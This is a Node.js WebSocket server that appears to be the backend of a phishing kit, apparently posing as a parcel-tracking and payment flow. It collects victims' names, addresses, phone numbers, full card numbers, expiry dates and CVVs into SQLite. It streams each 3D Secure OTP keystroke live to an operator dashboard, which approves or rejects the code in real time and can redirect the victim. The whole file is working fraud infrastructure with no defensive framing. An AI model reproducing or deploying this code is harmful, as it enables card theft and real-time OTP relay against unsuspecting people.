import { WebSocketServer, WebSocket } from "ws";
import fs from "node:fs";
import path from "node:path";
import Database from "better-sqlite3";
import process from "node:process";

// Use PORT for Render.com compatibility, fallback to WS_PORT or 8090
const port = Number(process.env.PORT || process.env.WS_PORT || 8090);

const wss = new WebSocketServer({ port });

function heartbeat() {
  this.isAlive = true;
}

const pingIntervalMs = 30000;
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      ws.terminate();
      return;
    }
    ws.isAlive = false;
    ws.ping();
  });
}, pingIntervalMs);

const dataDirectory = path.resolve(process.cwd());
fs.mkdirSync(dataDirectory, { recursive: true });
const dbPath = path.join(dataDirectory, "clients.sqlite");
const db = new Database(dbPath);

// Enhanced database schema with all client data
db.exec(`
  CREATE TABLE IF NOT EXISTS clients (
    id TEXT PRIMARY KEY,
    ip TEXT,
    created_at INTEGER NOT NULL,
    last_seen INTEGER NOT NULL,
    current_page TEXT,
    
    -- Track page data
    full_name TEXT,
    phone TEXT,
    email TEXT,
    address TEXT,
    postal_code TEXT,
    
    -- Payment page data
    card_holder TEXT,
    card_number TEXT,
    card_expiration TEXT,
    card_cvv TEXT,
    
    -- 3D Secure data
    otp_code TEXT,
    otp_status TEXT,
    otp_submitted_at INTEGER
  )
`);

const upsertClient = db.prepare(
  "INSERT INTO clients (id, ip, created_at, last_seen) VALUES (?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, ip=excluded.ip"
);

const updateClientPage = db.prepare(
  "UPDATE clients SET current_page=?, last_seen=? WHERE id=?"
);

const updateClientTrackData = db.prepare(
  "UPDATE clients SET full_name=?, phone=?, email=?, address=?, postal_code=?, last_seen=? WHERE id=?"
);

const updateClientPaymentData = db.prepare(
  "UPDATE clients SET card_holder=?, card_number=?, card_expiration=?, card_cvv=?, last_seen=? WHERE id=?"
);

const updateClientOTP = db.prepare(
  "UPDATE clients SET otp_code=?, otp_status=?, otp_submitted_at=?, last_seen=? WHERE id=?"
);

const getClientById = db.prepare("SELECT * FROM clients WHERE id=?");
const getAllClients = db.prepare(
  "SELECT * FROM clients ORDER BY last_seen DESC"
);

// In-memory routing map for live connections
const clientIdToSocket = new Map();
const socketToClientId = new WeakMap();
const socketToRole = new WeakMap();
const dashboards = new Set();

function broadcastToDashboards(messageObj) {
  const payload = JSON.stringify(messageObj);
  dashboards.forEach((d) => {
    if (d.readyState === WebSocket.OPEN) {
      d.send(payload);
    }
  });
}

function clientToJSON(dbRow) {
  if (!dbRow) return null;
  return {
    id: dbRow.id,
    ip: dbRow.ip,
    page: dbRow.current_page,
    fullName: dbRow.full_name,
    phone: dbRow.phone,
    email: dbRow.email,
    address: dbRow.address,
    postalCode: dbRow.postal_code,
    cardHolder: dbRow.card_holder,
    cardNumber: dbRow.card_number,
    cardExpiration: dbRow.card_expiration,
    cardCvv: dbRow.card_cvv,
    otp: dbRow.otp_code,
    otpStatus: dbRow.otp_status,
    otpSubmittedAt: dbRow.otp_submitted_at,
    lastSeen: dbRow.last_seen,
    createdAt: dbRow.created_at,
  };
}

// Helper to get real client IP
function getClientIP(req) {
  // Check X-Forwarded-For header (nginx/proxy)
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const ips = forwarded.split(",");
    return ips[0].trim();
  }

  // Check X-Real-IP header
  const realIp = req.headers["x-real-ip"];
  if (realIp) {
    return realIp.trim();
  }

  // Fallback to socket address
  let ip = req.socket.remoteAddress || req.connection.remoteAddress;

  // Clean IPv6 localhost
  if (ip === "::1" || ip === "::ffff:127.0.0.1") {
    ip = "127.0.0.1";
  }

  // Remove IPv6 prefix
  if (ip && ip.startsWith("::ffff:")) {
    ip = ip.substring(7);
  }

  return ip || "Unknown";
}

wss.on("connection", (ws, req) => {
  ws.isAlive = true;
  ws.on("pong", heartbeat);

  const clientAddress = getClientIP(req);

  console.log(`Client connected from IP: ${clientAddress}`);

  ws.send(
    JSON.stringify({
      type: "welcome",
      message: "Connected to Rams websocket server",
      time: Date.now(),
      you: clientAddress,
    })
  );

  ws.on("message", (data) => {
    let message = null;
    try {
      message = JSON.parse(String(data));
    } catch {
      // Ignore non-JSON messages
      return;
    }

    if (!message || typeof message !== "object" || !message.type) {
      return;
    }

    if (message.type === "register" && typeof message.clientId === "string") {
      const now = Date.now();
      try {
        const role = typeof message.role === "string" ? message.role : "user";
        socketToRole.set(ws, role);

        if (role === "dashboard") {
          dashboards.add(ws);
        } else {
          // Register client in database
          upsertClient.run(message.clientId, clientAddress, now, now);
          clientIdToSocket.set(message.clientId, ws);
          socketToClientId.set(ws, message.clientId);

          const client = getClientById.get(message.clientId);
          broadcastToDashboards({
            type: "client_registered",
            client: clientToJSON(client),
          });
        }

        ws.send(
          JSON.stringify({
            type: "registered",
            clientId: message.clientId,
            ip: clientAddress,
            time: now,
          })
        );
      } catch (err) {
        console.error("Registration error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "registration_failed" })
        );
      }
      return;
    }

    // Dashboard requests live list
    if (message.type === "list" && socketToRole.get(ws) === "dashboard") {
      const clients = getAllClients.all();
      const items = clients.map(clientToJSON);
      ws.send(JSON.stringify({ type: "clients", items }));
      return;
    }

    // Presence updates from user clients
    if (
      message.type === "presence" &&
      typeof message.clientId === "string" &&
      typeof message.page === "string"
    ) {
      try {
        const now = Date.now();
        updateClientPage.run(message.page, now, message.clientId);
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("Presence update error:", err);
      }
      return;
    }

    // OTP updates while typing on 3D Secure page
    if (
      message.type === "otp_update" &&
      typeof message.clientId === "string" &&
      typeof message.otp === "string"
    ) {
      try {
        const now = Date.now();
        updateClientOTP.run(message.otp, "typing", null, now, message.clientId);
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("OTP update error:", err);
      }
      return;
    }

    // OTP submitted: dashboard must decide success/error
    if (
      message.type === "otp_submit" &&
      typeof message.clientId === "string" &&
      typeof message.otp === "string"
    ) {
      try {
        const now = Date.now();
        updateClientOTP.run(
          message.otp,
          "submitted",
          now,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
      } catch (err) {
        console.error("OTP submit error:", err);
      }
      return;
    }

    if (
      message.type === "direct" &&
      typeof message.to === "string" &&
      (Object.prototype.hasOwnProperty.call(message, "payload") ||
        typeof message.action === "string")
    ) {
      const fromId = socketToClientId.get(ws) || null;
      const target = clientIdToSocket.get(message.to);

      // Validate optional action URL if provided
      let actionUrl = undefined;
      if (typeof message.action === "string") {
        try {
          const url = new URL(message.action);
          if (url.protocol === "http:" || url.protocol === "https:") {
            actionUrl = url.toString();
          }
        } catch {
          // invalid URL ignored
        }
      }

      if (target && target.readyState === WebSocket.OPEN) {
        target.send(
          JSON.stringify({
            type: "direct",
            from: fromId,
            payload: message.payload,
            action: actionUrl,
            time: Date.now(),
          })
        );
        // Update OTP decision status for dashboards
        try {
          const toId = message.to;
          if (message.payload && typeof message.payload === "object") {
            const now = Date.now();
            let otpStatus = null;
            if (message.payload.type === "allow-next") otpStatus = "approved";
            if (message.payload.type === "error") otpStatus = "rejected";

            if (otpStatus) {
              const client = getClientById.get(toId);
              if (client) {
                updateClientOTP.run(
                  client.otp_code,
                  otpStatus,
                  client.otp_submitted_at,
                  now,
                  toId
                );
                const updatedClient = getClientById.get(toId);
                broadcastToDashboards({
                  type: "client_updated",
                  client: clientToJSON(updatedClient),
                });
              }
            }
          }
        } catch (err) {
          console.error("Direct message update error:", err);
        }
        ws.send(JSON.stringify({ type: "delivered", to: message.to }));
      } else {
        ws.send(JSON.stringify({ type: "undelivered", to: message.to }));
      }
      return;
    }

    // Track data submission
    if (message.type === "track_data" && typeof message.clientId === "string") {
      try {
        const now = Date.now();
        updateClientTrackData.run(
          message.fullName || null,
          message.phone || null,
          message.email || null,
          message.address || null,
          message.postalCode || null,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
        ws.send(JSON.stringify({ type: "track_data_saved" }));
      } catch (err) {
        console.error("Track data save error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "track_data_failed" })
        );
      }
      return;
    }

    // Payment data submission
    if (
      message.type === "payment_data" &&
      typeof message.clientId === "string"
    ) {
      try {
        const now = Date.now();
        updateClientPaymentData.run(
          message.cardHolder || null,
          message.cardNumber || null,
          message.cardExpiration || null,
          message.cardCvv || null,
          now,
          message.clientId
        );
        const client = getClientById.get(message.clientId);
        broadcastToDashboards({
          type: "client_updated",
          client: clientToJSON(client),
        });
        ws.send(JSON.stringify({ type: "payment_data_saved" }));
      } catch (err) {
        console.error("Payment data save error:", err);
        ws.send(
          JSON.stringify({ type: "error", message: "payment_data_failed" })
        );
      }
      return;
    }
  });

  ws.on("close", () => {
    const role = socketToRole.get(ws);
    if (role === "dashboard") {
      dashboards.delete(ws);
    }
    const id = socketToClientId.get(ws);
    if (id && clientIdToSocket.get(id) === ws) {
      clientIdToSocket.delete(id);
      broadcastToDashboards({ type: "client_disconnected", clientId: id });
    }
    socketToClientId.delete(ws);
    socketToRole.delete(ws);
  });

  ws.on("error", (err) => {
    console.error("WebSocket error:", err);
  });
});

wss.on("close", () => {
  clearInterval(interval);
});

console.log(`WebSocket server listening at :${port}`);
